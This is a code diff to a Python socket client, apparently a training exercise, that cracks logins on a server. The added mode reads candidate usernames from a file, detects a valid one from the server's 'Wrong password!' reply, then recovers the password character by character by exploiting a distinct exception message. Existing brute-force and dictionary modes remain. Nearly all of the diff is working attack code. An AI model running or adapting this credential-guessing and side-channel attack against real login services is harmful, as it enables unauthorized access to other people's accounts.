@@ -3,6 +3,7 @@ import sys
 import socket
 import itertools
 import string
+import json
 
 args = sys.argv
 if len(args) != 3:
@@ -12,8 +13,8 @@ else:
     port = int(args[2])
 
 
-def find_password(socket_cl, mode='dictionary'):
-    if mode == 'bruteforce':
+def find_password(socket_cl, mode='log_pass'):
+    if mode == 'bruteforce_pass':
         alpha_num_list = list(string.ascii_lowercase + string.digits)
         i = 1
         counter = 1
@@ -29,7 +30,7 @@ def find_password(socket_cl, mode='dictionary'):
                 counter += 1
             i += 1
 
-    if mode == 'dictionary':
+    if mode == 'dictionary_password':
         with open('passwords.txt') as file:
             lst_pass = file.readlines()
             lst_pass = [password.rstrip() for password in lst_pass]
@@ -43,6 +44,44 @@ def find_password(socket_cl, mode='dictionary'):
                     response_form_ser = response_form_ser.decode()
                     if response_form_ser == 'Connection success!':
                         return password
+
+    if mode == 'log_pass':
+        def send_request(login, password):
+            dct_send = {'login': login_non_case, 'password': password}
+            json_send = json.dumps(dct_send).encode()
+            socket_cl.send(json_send)
+            json_recieved = socket_cl.recv(1024)
+            message_1 = json.loads(json_recieved)['result']
+            return message_1
+
+        with open('hacking/logins.txt') as file:
+            lst_login = file.readlines()
+            lst_login = [password.rstrip() for password in lst_login]
+            password = ' '
+            for login_non_case in lst_login:
+                message_received = send_request(login_non_case, password)
+                if message_received == 'Wrong password!':
+                    correct_login = login_non_case
+                    break
+        alpha_num_list = list(string.ascii_letters + string.digits)
+        flag = True
+        password = ''
+        while flag:
+            try:
+                for symbol in alpha_num_list:
+                    pass_str = password + symbol
+                    message_received = send_request(correct_login, pass_str)
+                    if message_received == "Exception happened during login":
+                        password = pass_str
+                        break
+                    elif message_received == "Connection success!":
+                        flag = False
+                        result = json.dumps({'login': correct_login, 'password': pass_str})
+            except ConnectionResetError:
+                pass
+            except ConnectionAbortedError:
+                pass
+        return result
 
 
 # creating a client socket
